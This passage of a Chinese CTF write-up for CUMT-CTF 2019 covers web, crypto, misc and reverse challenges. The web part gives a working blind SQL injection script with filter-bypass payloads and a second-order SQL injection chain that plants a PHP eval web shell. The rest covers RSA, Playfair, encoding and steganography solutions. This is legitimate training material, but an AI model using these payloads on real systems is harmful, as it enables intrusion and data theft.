class=\"line\">http:&#x2F;&#x2F;bxs.cumt.edu.cn:30010&#x2F;test&#x2F;index.php?id&#x3D;2&gt;2 || length(&#39;seleselectct&#39;)&#x3D;6</span><br></pre></td></tr></table></figure>\n<p>测试发现过滤了 <code>select,or,空格</code>，空格可用<code>/**/</code>绕过，select等可双写绕过，接下来只需要编写盲注脚本即可</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> requests</span><br><span class=\"line\"></span><br><span class=\"line\">words = <span class=\"string\">\"2019~\"</span></span><br><span class=\"line\">url = <span class=\"string\">\"http://bxs.cumt.edu.cn:30010/test/index.php?id=\"</span></span><br><span class=\"line\">table = <span class=\"string\">\"\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># payload = \"2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()),&#123;&#125;,1))=&#123;&#125;\"</span></span><br><span class=\"line\"><span class=\"comment\"># emails,flagishere,referers,uagents,users</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># payload = \"2&gt;2/**/||/**/ascii(substr((seselectlect/**/group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='flagishere'),&#123;&#125;,1))=&#123;&#125;\"</span></span><br><span class=\"line\"><span class=\"comment\"># Id,flag</span></span><br><span class=\"line\"></span><br><span class=\"line\">payload = <span class=\"string\">\"2&gt;2/**/||/**/ascii(substr((seselectlect/**/flag/**/from/**/flagishere),&#123;&#125;,1))=&#123;&#125;\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">1</span>,<span class=\"number\">60</span>):</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">34</span>,<span class=\"number\">128</span>):</span><br><span class=\"line\">\t\tres = requests.get(url+payload.format(j,i)).text</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> words <span class=\"keyword\">in</span> res:</span><br><span class=\"line\">\t\t\ttable += chr(i)</span><br><span class=\"line\">\t\t\tprint(table)</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span></span><br></pre></td></tr></table></figure>\n<p>可以得到flag如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;4nother_SimPLE_SQLi_0rek1&#125;</span><br></pre></td></tr></table></figure>\n<p>后来和出题人交流了一下，思路非预期2333~</p>\n<h2 id=\"文件管理系统\"><a href=\"#文件管理系统\" class=\"headerlink\" title=\"文件管理系统\"></a>文件管理系统</h2><p>网站有主要功能是上传文件和修改、删除文件，过滤了php等相关的文件名，无法绕过，原本的我的思路是上传一个<code>xxxx.jpg</code>，然后修改文件名，通过修改文件名为 <code>xxxx.php%00.jpg</code> 或者其它方法截断后面的jpg后缀，结果尝试了各种姿势都未果，无可奈何之下扫了一波目录，结果柳暗花明，得到了源码<code>www.zip</code></p>\n<p>核心代码如下</p>\n<p>upload.php</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">\"common.inc.php\"</span>;</span><br><span class=\"line\">define(<span class=\"string\">'ROOT'</span>,dirname(<span class=\"keyword\">__FILE__</span>).<span class=\"string\">'/'</span>); </span><br><span class=\"line\"><span class=\"keyword\">if</span>($_FILES)</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    $file = $_FILES[<span class=\"string\">\"upfile\"</span>];</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($file[<span class=\"string\">\"error\"</span>] == UPLOAD_ERR_OK) &#123;</span><br><span class=\"line\">        $name = basename($file[<span class=\"string\">\"name\"</span>]);</span><br><span class=\"line\">        $path_parts = pathinfo($name);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!in_array($path_parts[<span class=\"string\">\"extension\"</span>], <span class=\"keyword\">array</span>(<span class=\"string\">\"gif\"</span>, <span class=\"string\">\"jpg\"</span>, <span class=\"string\">\"png\"</span>, <span class=\"string\">\"zip\"</span>, <span class=\"string\">\"txt\"</span>))) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">\"error extension\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $path_parts[<span class=\"string\">\"extension\"</span>] = <span class=\"string\">\".\"</span> . $path_parts[<span class=\"string\">\"extension\"</span>];</span><br><span class=\"line\">        $name = $path_parts[<span class=\"string\">\"filename\"</span>] . $path_parts[<span class=\"string\">\"extension\"</span>];       </span><br><span class=\"line\">        $path_parts[<span class=\"string\">'filename'</span>] = addslashes($path_parts[<span class=\"string\">'filename'</span>]);</span><br><span class=\"line\">        $sql = <span class=\"string\">\"select * from `file` where `filename`='&#123;$path_parts['filename']&#125;' and `extension`='&#123;$path_parts['extension']&#125;'\"</span>;</span><br><span class=\"line\">        $fetch = $db-&gt;query($sql);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>($fetch-&gt;num_rows&gt;<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">\"file is exists\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"comment\">//echo $file[\"tmp_name\"], ROOT . UPLOAD_DIR . $name;</span></span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file($file[<span class=\"string\">\"tmp_name\"</span>], ROOT . UPLOAD_DIR . $name)) &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">            $sql = <span class=\"string\">\"insert into `file` ( `filename`, `view`, `extension`) values( '&#123;$path_parts['filename']&#125;', 0, '&#123;$path_parts['extension']&#125;')\"</span>;</span><br><span class=\"line\">            $re = $db-&gt;query($sql);</span><br><span class=\"line\">            <span class=\"keyword\">if</span>(!$re) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">echo</span> <span class=\"string\">'error'</span>;</span><br><span class=\"line\">                print_r($db-&gt;error);</span><br><span class=\"line\">                <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            $url = <span class=\"string\">\"/\"</span> . UPLOAD_DIR . $name;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"Your file is upload, url:</span></span><br><span class=\"line\"><span class=\"string\">                &lt;a href=\\\"&#123;$url&#125;\\\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;a href=\\\"/\\\"&gt;go back&lt;/a&gt;\"</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>(<span class=\"string\">\"upload error\"</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        print_r(error_get_last());</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">``` </span><br><span class=\"line\"></span><br><span class=\"line\">rename.php</span><br><span class=\"line\"></span><br><span class=\"line\">```php</span><br><span class=\"line\"><span class=\"keyword\">require_once</span> <span class=\"string\">\"common.inc.php\"</span>;</span><br><span class=\"line\">define(<span class=\"string\">'ROOT'</span>,dirname(<span class=\"keyword\">__FILE__</span>).<span class=\"string\">'/'</span>); </span><br><span class=\"line\"><span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>($req[<span class=\"string\">'oldname'</span>]) &amp;&amp; <span class=\"keyword\">isset</span>($req[<span class=\"string\">'newname'</span>])) &#123;</span><br><span class=\"line\">    $result = $db-&gt;query(<span class=\"string\">\"select * from `file` where `filename`='&#123;$req['oldname']&#125;'\"</span>);</span><br><span class=\"line\">    <span class=\"keyword\">if</span> ($result-&gt;num_rows&gt;<span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">        $result = $result-&gt;fetch_assoc();</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">exit</span>(<span class=\"string\">\"old file doesn't exists!\"</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">if</span>($result) &#123;</span><br><span class=\"line\">        $req[<span class=\"string\">'newname'</span>] = basename($req[<span class=\"string\">'newname'</span>]);</span><br><span class=\"line\">        $re = $db-&gt;query(<span class=\"string\">\"update `file` set `filename`='&#123;$req['newname']&#125;', `oldname`='&#123;$result['filename']&#125;' where `fid`=&#123;$result['fid']&#125;\"</span>);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(!$re) &#123;</span><br><span class=\"line\">            print_r($db-&gt;errorInfo());</span><br><span class=\"line\">            <span class=\"keyword\">exit</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        $oldname = ROOT.UPLOAD_DIR . $result[<span class=\"string\">\"filename\"</span>].$result[<span class=\"string\">\"extension\"</span>];</span><br><span class=\"line\">        $newname = ROOT.UPLOAD_DIR . $req[<span class=\"string\">\"newname\"</span>].$result[<span class=\"string\">\"extension\"</span>];</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(file_exists($oldname)) &#123;</span><br><span class=\"line\">            rename($oldname, $newname);</span><br><span class=\"line\">            $url = <span class=\"string\">\"/\"</span> . $newname;</span><br><span class=\"line\">            <span class=\"keyword\">echo</span> <span class=\"string\">\"Your file is rename, url:</span></span><br><span class=\"line\"><span class=\"string\">                &lt;a href=\\\"&#123;$url&#125;\\\" target='_blank'&gt;&#123;$url&#125;&lt;/a&gt;&lt;br/&gt;</span></span><br><span class=\"line\"><span class=\"string\">                &lt;a href=\\\"/\\\"&gt;go back&lt;/a&gt;\"</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">else</span>&#123;<span class=\"keyword\">echo</span> $oldname.<span class=\"string\">\" not exists.\"</span>;&#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br></pre></td></tr></table></figure>\n<p>由代码可以看出，题目是通过数据库来拼凑最终的文件名，审计了下代码没发现什么有用的思路，google了一下居然找到了原题！！2233 <a href=\"http://drops.xmd5.com/static/drops/tips-10564.html\" target=\"_blank\" rel=\"noopener\">http://drops.xmd5.com/static/drops/tips-10564.html</a>，而且还给出了攻击流程，本题是个二次注入。</p>\n<p>题目使用了白名单过滤，所以所以无法通过后缀名绕过，而题目，漏洞发生在rename.php页面中，实现重命名功能时，在数据库中以文件名来查询，获取文件扩展名，id等信息，然后我们输入的新的文件名和查询的文件扩展名拼接在一起完成重命名，如果我们能够使查询的文件扩展名为空，那么拼接之后就只剩下我们的文件名了，通过这种方法可以实现修改文件名后缀的目的，攻击流程如下</p>\n<ol>\n<li><p>选择一个文件上传，命名为 <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg.jpg</code>，此时执行的sql语句是<code>insert into <code>file</code> ( <code>filename</code>, <code>view</code>, <code>extension</code>) values( ‘{$path_parts[‘filename’]}’, 0, ‘{$path_parts[‘extension’]}’)</code>，此时的数据库中<code>filename--&gt;&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>，<code>extension--&gt;jpg</code></p>\n</li>\n<li><p>利用update更新是的后缀名为空，<em>old name:</em>  <code>&#39;,extension=&#39;&#39;,filename=&#39;snow.jpg</code>;<em>new name:</em> <code>snow.jpg</code>，此时执行的sql命令变成<br><code>update <code>file</code> set <code>filename</code>=’snow.jpg’,<code>oldname</code>=’’,extension=’’,filename=’snow.jpg.jpg’ where <code>fid</code>={$result[‘fid’]};</code> ，这样的话数据库中就有文件名为 <code>snow.jpg</code>，后缀名为空的记录，但是实际的文件名却是<code>snow.jpg.jpg</code></p>\n</li>\n<li><p>上传真正包含shell的文件<code>&lt;?php @eval($_POST[&#39;snow&#39;]);?&gt;</code> ，命名为<code>snow.jpg</code>，数据库中的记录是文件名为snow，扩展名为jpg，</p>\n</li>\n<li><p>使用rename重命名 <em>old name:</em> <code>snow.jpg</code>，<em>new name:</em> <code>snow.php</code>，此时修改的是文件名是snow.jpg，后缀名为空，此时修改文件名为<code>snow.php</code>，后缀名为空，拼接后就是成功地更名为snow.php，然后访问snow.php即可getshell。</p>\n</li>\n</ol>\n<p><img src=\"https://i.loli.net/2019/01/27/5c4d642c02f24.png\" alt></p>\n<p><img src=\"https://i.loli.net/2019/01/27/5c4d642bedc54.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;f34f8aa6cd362582dd1ae5f975c7b20f&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"crypto\"><a href=\"#crypto\" class=\"headerlink\" title=\"crypto\"></a>crypto</h1><h2 id=\"现代密码签到\"><a href=\"#现代密码签到\" class=\"headerlink\" title=\"现代密码签到\"></a>现代密码签到</h2><p>利用在线des解密，密钥为空。<br>解密后发现<br><code>U2FsdGVkX18968C+7acWUzWtYyuQd2MFLMh0HnGGnMlmYlemknPnfg==</code><br>是base64编码，将所得结果再次解密得到flag<br><img src=\"https://i.imgur.com/jPfKQ85.png\" alt></p>\n<h2 id=\"古典密码签到\"><a href=\"#古典密码签到\" class=\"headerlink\" title=\"古典密码签到\"></a>古典密码签到</h2><p>看到字符串带<code>=</code>，猜测是base系列编码，解密发现是base32编码 ^pho^oav`\\ntZnj`\\ntZZZcccx ，之后就是移位密码了，当偏移量是5的时候解密出有意义的明文</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\">s = <span class=\"string\">\"xxxxxxxxxxxxx\"</span></span><br><span class=\"line\">flag = <span class=\"string\">\"\"</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> s:</span><br><span class=\"line\">\tflag += chr(ord(i)+<span class=\"number\">5</span>)</span><br><span class=\"line\">print(flag)</span><br><span class=\"line\">```</span><br></pre></td></tr></table></figure>\n<p>cumtctf{easy_soeasy___hhh}<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">## easyrsa</span><br><span class=\"line\"></span><br><span class=\"line\">本题e很小，联想到应该是低指数攻击，本来以为是16进制，但是一直不对，细看了一下发现只有0-9和A，b共12个字符，猜测应该是12进制，尝试了一下果然就是12进制</span><br><span class=\"line\"></span><br><span class=\"line\">&#96;&#96;&#96;python</span><br><span class=\"line\"># coding&#x3D;utf-8</span><br><span class=\"line\">import gmpy2</span><br><span class=\"line\">e &#x3D; 5</span><br><span class=\"line\"># 读入 n, 密文</span><br><span class=\"line\">n &#x3D; int(&#39;36004b9A985A624479A4891b16130722A5A7453989bA61737A226368504A5689381236451796A445824b5A516b176b40135935b0b8999046154359b0560537100289b9795129505b461542A4897A56561529A705135AA772507bb3172b03b3425A99224b68b45b801459b29A070bAb9408761b4A70b905308772472934486924bA17013A2A801041A05178b0488AA5&#39;,12)</span><br><span class=\"line\">c &#x3D; int(&#39;411A016A671768793b5AAbA4A043001A468b8A9A6122290461266393181b021812b6AAbAA1b57161bAA300321174154862338b0098249626A93116b34752540987309A08520bb6780804b5679144173Ab7301b49322587504A75A7A2445928A07A650bb6076bA3412b1375205336b43A11A1510A22893b937065&#39;,12)</span><br><span class=\"line\">m, b &#x3D; gmpy2.iroot(c, e)</span><br><span class=\"line\">print hex(m)[2:].decode(&#39;hex&#39;)</span><br></pre></td></tr></table></figure></p>\n<p>flag如下：<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">cumtctf&#123;12_jinzhi_rsa&#125;</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"playfir\"><a href=\"#playfir\" class=\"headerlink\" title=\"playfir\"></a>playfir</h2><p>题目提示很明显，playfire密码爆破，可以看到秘钥是四位，代码如下</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># playfair</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> string</span><br><span class=\"line\"><span class=\"keyword\">import</span> itertools</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 返回该字符的行号和列号</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_row_col</span><span class=\"params\">(word,pass_table)</span>:</span></span><br><span class=\"line\">\tli = pass_table.index(word)</span><br><span class=\"line\">\tli_r = li // <span class=\"number\">5</span></span><br><span class=\"line\">\tli_c = li % <span class=\"number\">5</span></span><br><span class=\"line\">\t<span class=\"keyword\">return</span> (li_r,li_c)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 输入两个元素的坐标，得到解密对应的两个元素</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">get_dou_word</span><span class=\"params\">(r1,c1,r2,c2)</span>:</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> r1 == r2:</span><br><span class=\"line\">\t\tc1 = (c1<span class=\"number\">-1</span>) % <span class=\"number\">5</span></span><br><span class=\"line\">\t\tc2 = (c2<span class=\"number\">-1</span>) % <span class=\"number\">5</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> [(r1,c1),(r2,c2)]</span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> c1 == c2:</span><br><span class=\"line\">\t\tr1 = (r1<span class=\"number\">-1</span>) % <span class=\"number\">5</span> </span><br><span class=\"line\">\t\tr2 = (r2<span class=\"number\">-1</span>) % <span class=\"number\">5</span></span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> [(r1,c1),(r2,c2)]</span><br><span class=\"line\">\t<span class=\"keyword\">else</span>:</span><br><span class=\"line\">\t\t<span class=\"keyword\">return</span> [(r1,c2),(r2,c1)]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 解密函数</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">decrypt</span><span class=\"params\">(cip,keyword)</span>:</span></span><br><span class=\"line\">\t<span class=\"comment\"># global pass_table</span></span><br><span class=\"line\">\talpha = list(string.ascii_uppercase)</span><br><span class=\"line\">\talpha.remove(<span class=\"string\">'J'</span>)</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> keyword:</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> i == <span class=\"string\">\"J\"</span>:</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">continue</span> </span><br><span class=\"line\">\t\talpha.remove(i)</span><br><span class=\"line\">\tpass_table = list(keyword) + alpha</span><br><span class=\"line\">\tplain = <span class=\"string\">\"\"</span></span><br><span class=\"line\">\t<span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(len(cip)//<span class=\"number\">2</span>):</span><br><span class=\"line\">\t\tgrp = cip[i*<span class=\"number\">2</span>:i*<span class=\"number\">2</span>+<span class=\"number\">2</span>]</span><br><span class=\"line\">\t\tr1,c1 = get_row_col(grp[<span class=\"number\">0</span>],pass_table)</span><br><span class=\"line\">\t\tr2,c2 = get_row_col(grp[<span class=\"number\">1</span>],pass_table)</span><br><span class=\"line\">\t\ttemp = get_dou_word(r1,c1,r2,c2)</span><br><span class=\"line\">\t\tp1 = temp[<span class=\"number\">0</span>][<span class=\"number\">0</span>]*<span class=\"number\">5</span> + temp[<span class=\"number\">0</span>][<span class=\"number\">1</span>]</span><br><span class=\"line\">\t\tp2 = temp[<span class=\"number\">1</span>][<span class=\"number\">0</span>]*<span class=\"number\">5</span> + temp[<span class=\"number\">1</span>][<span class=\"number\">1</span>]</span><br><span class=\"line\">\t\tplain += pass_table[p1] + pass_table[p2]</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> plain</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> sss <span class=\"keyword\">in</span> itertools.permutations(string.ascii_uppercase,<span class=\"number\">4</span>):</span><br><span class=\"line\">\tnow_key = <span class=\"string\">\"\"</span>.join(sss)</span><br><span class=\"line\">\tcip1 = <span class=\"string\">\"DMBCCVTLMNKQ\"</span></span><br><span class=\"line\">\tcip2 = <span class=\"string\">\"LRBECXPTCPHU\"</span></span><br><span class=\"line\">\tt1 = decrypt(cip1,now_key)</span><br><span class=\"line\">\tt2 = decrypt(cip2,now_key)</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> <span class=\"string\">\"FLAGA\"</span> <span class=\"keyword\">in</span> t1:</span><br><span class=\"line\">\t\tprint(t1)</span><br><span class=\"line\">\t\t<span class=\"keyword\">continue</span></span><br><span class=\"line\">\t<span class=\"keyword\">elif</span> <span class=\"string\">\"FLAGB\"</span> <span class=\"keyword\">in</span> t2:</span><br><span class=\"line\">\t\tprint(t2)</span><br><span class=\"line\">\t\t<span class=\"keyword\">continue</span></span><br></pre></td></tr></table></figure>\n<p>可以得到爆破出来符合条件的明文，找出语义正确的即可</p>\n<blockquote>\n<p>flagaplayfirflagbyoudoit</p>\n</blockquote>\n<p>求出md5值即可</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;355c1fb44b58ad7c38d88b5ba4f095b0&#125;</span><br></pre></td></tr></table></figure>\n<h1 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h1><h2 id=\"misc签到\"><a href=\"#misc签到\" class=\"headerlink\" title=\"misc签到\"></a>misc签到</h2><p>解压之后给出了5个图片文件:</p>\n<p><img src=\"https://i.loli.net/2019/01/29/5c4fc4c6822ca.png\" alt></p>\n<p>文件夹名是braille，想到了盲文，搜索盲文对照表</p>\n<p><img src=\"https://i.loli.net/2019/01/29/5c4fc69264c59.png\" alt></p>\n<p>根据解压文件夹的提示可以对照出flag是B1ind。</p>\n<h2 id=\"base全家桶了解一下\"><a href=\"#base全家桶了解一下\" class=\"headerlink\" title=\"base全家桶了解一下??\"></a>base全家桶了解一下??</h2><p>应该就是base编码的转换，尝试一下不同的base编码即可</p>\n<p>第一层base64</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">GY3DMQZWGE3DON2CGU3TMNJWIM3DGMZQGZCDMNJVIY3TIMZQGMYDKRRWGM3TKNSEG42DMMZXGQ3DMN2E</span><br></pre></td></tr></table></figure>\n<p>第二层base32</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">666C61677B57656C63306D655F7430305F63756D746374667D</span><br></pre></td></tr></table></figure>\n<p>第三层base16</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;Welc0me_t00_cumtctf&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"BXS图标真好看\"><a href=\"#BXS图标真好看\" class=\"headerlink\" title=\"BXS图标真好看\"></a>BXS图标真好看</h2><p>记事本打开发现是一个二进制文件，file命令查看一下文件类型</p>\n<blockquote>\n<p>BXS.txt: PNG image data, 495 x 422, 8-bit/color RGBA, non-interlaced</p>\n</blockquote>\n<p>修改后缀为png，看到一串文字<code>fgoo kwnl{_u n_gaDy_ 0p}</code>，提示古典加密，猜测是栅栏密码，因为字符串长度是21，所以应该分三栏</p>\n<p><img src=\"https://i.loli.net/2019/01/25/5c4a720c0a5e5.png\" alt></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;Do_you_kn0w_png&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"矿大校歌认真听听吧？\"><a href=\"#矿大校歌认真听听吧？\" class=\"headerlink\" title=\"矿大校歌认真听听吧？\"></a>矿大校歌认真听听吧？</h2><p>下载zip压缩包，解压后需要密码，在16进制编辑器文件尾部看到<code>cumtctf2019</code>，解压即可得到一个mp3文件，音频也没有什么异常，应该是mp3隐写了<a href=\"https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2\" target=\"_blank\" rel=\"noopener\">https://ctf-wiki.github.io/ctf-wiki/misc/audio/introduction/#_2</a>，运行尝试一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">Decode.exe -X -P cumtctf2019 cumt.mp3</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">flag&#123;cumtctf_1s_v3ry_g00d!&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"起床改error啦！\"><a href=\"#起床改error啦！\" class=\"headerlink\" title=\"起床改error啦！\"></a>起床改error啦！</h2><p>binwalk查看图片发现存在zip压缩包，提取一下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">binwalk 2333.png</span><br><span class=\"line\">foremost 2333.png</span><br></pre></td></tr></table></figure>\n<p>解压压缩包可以得到一个doc文件，在选项中查看隐藏文字即可看到flag</p>\n<p><img src=\"https://i.loli.net/2019/01/27/5c4d21fd3ea8c.png\" alt></p>\n<h1 id=\"RE\"><a href=\"#RE\" class=\"headerlink\" title=\"RE\"></a>RE</h1><h2 id=\"逆向签到\"><a href=\"#逆向签到\" class=\"headerlink\" title=\"逆向签到\"></a>逆向签到</h2><p>直接丢进IDA查看，查看伪代码：</p>\n<p><img src=\"https://i.loli.net/2019/01/28/5c4f1b9f3be88.png\" alt></p>\n<p>可以看到这些变量占用了4个字节来存储。</p>\n<p><img src=\"https://i.loli.net/2019/01/28/5c4f1ade58965.png\" alt></p>\n<p>这里的v35是100以内的任何数，也就是说可以通过爆破的方式来求得v35的值。</p>\n<p><img src=\"https://i.loli.net/2019/01/28/5c4f1c7412770.png\" alt></p>\n<p>查看check函数，s里面的数字应该和从v5开始，地址每加上4LL的值相等。也就是说在29位的flag里面，每一位的值和v5-v34相等。所以写一个简单的脚本即可爆破出来。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#coding:utf-8</span></span><br><span class=\"line\">v5 = [<span class=\"number\">53</span>,<span class=\"number\">63</span>,<span class=\"number\">50</span>,<span class=\"number\">52</span>,<span class=\"number\">40</span>,<span class=\"number\">1</span>,<span class=\"number\">50</span>,<span class=\"number\">61</span>,<span class=\"number\">55</span>,<span class=\"number\">99</span>,<span class=\"number\">62</span>,<span class=\"number\">118</span>,<span class=\"number\">98</span>,<span class=\"number\">60</span>,<span class=\"number\">60</span>,<span class=\"number\">12</span>,<span class=\"number\">106</span>,<span class=\"number\">58</span>,<span class=\"number\">37</span>,<span class=\"number\">54</span>,<span class=\"number\">12</span>,<span class=\"number\">38</span>,<span class=\"number\">12</span>,<span class=\"number\">102</span>,<span class=\"number\">48</span>,<span class=\"number\">60</span>,<span class=\"number\">33</span>,<span class=\"number\">54</span>,<span class=\"number\">46</span>]</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">100</span>):</span><br><span class=\"line\">    res = <span class=\"string\">\"\"</span></span><br><span class=\"line\">    <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>,<span class=\"number\">29</span>):</span><br><span class=\"line\">        res += chr(v5[j]^i)</span><br><span class=\"line\">    <span class=\"keyword\">print</span> res</span><br></pre></td></tr></table></figure>\n<p>运行结果：</p>\n<p><img src=\"https://i.loli.net/2019/01/28/5c4f1a3be6535.png\" alt></p>\n<h2 id=\"Eazy-Math\"><a href=\"#Eazy-Math\" class=\"headerlink\" title=\"Eazy_Math\"></a>Eazy_Math</h2><p>同样的，还是丢进IDA中查看伪代码：</p>\n<p><img src=\"https://i.loli.net/2019/01/28/5c4f1a6c49e42.png\" alt></p>\n<p>flag有9位，在经过String2Int和Change两个函数的变换后，如果check成功，即可成功。</p>\n<p>首先查看String2Int函数：</p>\n<p><img src=\"https://i.loli.net/2019/01/28/5c4f1be73b91e.png\" alt=\"img\"></p>\n<p>这个函数的作用就是将s里面的字符内容转换成int型的数值存储在v14-v18中。</p>\n<p>查看Check函数后，可以轻易看出check的内容就是将变换后的9位与v2-v10相比较。</p>\n<p>最后是Change函数：</p>\n<p><img src=\"https://i.loli.net/2019/01/28/5c4f1ab4dec43.png\" alt></p>\n<p>第一个双层循环将a3里面的数值置为0，也就是v4里面的值。第二个三重循环可以拆开来看。前两个变量i和j总共循环9次，代表着算出v4里面的数值。最后一个循环变量m则是计算的过程。这里不妨设9个未知数A,B,C,D,E,F,G,H,I。经过推算，3*k+m 是每次取三个连续的数，3*m+1是每次取0，3，6或1，4，7或2，5，8。这里代表着取v5-v13里面的数值。分析之后可以列出三个方程组：</p>\n<script type=\"math/tex; mode=display\">\\begin{cases}\nA+2B+C=274\\\\\n2A+B+C=294\\\\\nA+B+2C=316\n\\end{cases}</script><script type=\"math/tex; mode=display\">\n\\begin{cases}\nD+2E+F=262 \\\\\n2D+E+F=274 \\\\\nD+E+2F=252 \\\\\n\\end{cases}</script><script type=\"math/tex; mode=display\">\n\\begin{cases}\nG+2H+I=380 \\\\\n2G+H+I=421 \\\\\nG+H+2I=427 \\\\\n\\end{cases}</script><p>简单的方程组求得A-G的9个值转化为字符即为flag。</p>\n","categories":["writeup"],"tags":["CTF"]},{"title":"CUMT-CTF2017冬","url":"/2018/01/27/cumtctf2017/","content":"<p>第一次打ctf，感觉自己确实是个渣渣，不过万事开头难，有第一次总是好的，这次也让我意识到了自己的不足，自己要学的东西还是很多很多的。<br><a id=\"more\"></a></p>\n<h2 id=\"0x1-what？？\"><a href=\"#0x1-what？？\" class=\"headerlink\" 